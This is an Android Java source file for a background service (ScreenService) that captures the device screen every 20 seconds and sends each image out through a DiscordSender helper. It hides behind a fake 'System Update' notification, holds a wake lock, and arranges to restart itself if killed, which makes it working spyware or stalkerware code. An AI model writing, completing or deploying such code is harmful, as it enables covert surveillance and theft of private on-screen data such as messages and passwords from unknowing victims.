package com.tom5.monitor;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.display.*;
import android.media.*;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.nio.ByteBuffer;

public class ScreenService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler();
    private PowerManager.WakeLock wakeLock;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 1. تشغيل الإشعار فوراً لمنع الكراش
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, "sys_update")
                .setContentTitle("System Update")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build();
        startForeground(1, notification);

        // 2. منع المعالج من النوم
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "System:WakeLock");
        wakeLock.acquire();

        if (intent != null && intent.hasExtra("resData")) {
            int resCode = intent.getIntExtra("resCode", -1);
            Intent resData = intent.getParcelableExtra("resData");
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpm.getMediaProjection(resCode, resData);
            setupCapture();
        }
        return START_STICKY; // إعادة التشغيل تلقائياً إذا قتله النظام
    }

    private void setupCapture() {
        DisplayMetrics metrics = new DisplayMetrics();
        ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getMetrics(metrics);
        imageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("Monitor", metrics.widthPixels, metrics.heightPixels, 
                metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                captureAndSend();
                handler.postDelayed(this, 20000); // صورة كل 20 ثانية (أكثر استقراراً)
            }
        }, 5000);
    }

    private void captureAndSend() {
        try (Image image = imageReader.acquireLatestImage()) {
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int width = image.getWidth();
                int height = image.getHeight();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;

                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                
                File file = new File(getCacheDir(), "s.png");
                try (FileOutputStream out = new FileOutputStream(file)) {
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out); // تقليل الجودة لسرعة الإرسال
                    DiscordSender.sendPhoto(file);
                }
                bitmap.recycle();
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void createNotificationChannel() {
        NotificationChannel serviceChannel = new NotificationChannel("sys_update", "System Service", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(serviceChannel);
    }

    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { if (wakeLock != null) wakeLock.release(); super.onDestroy(); }
}
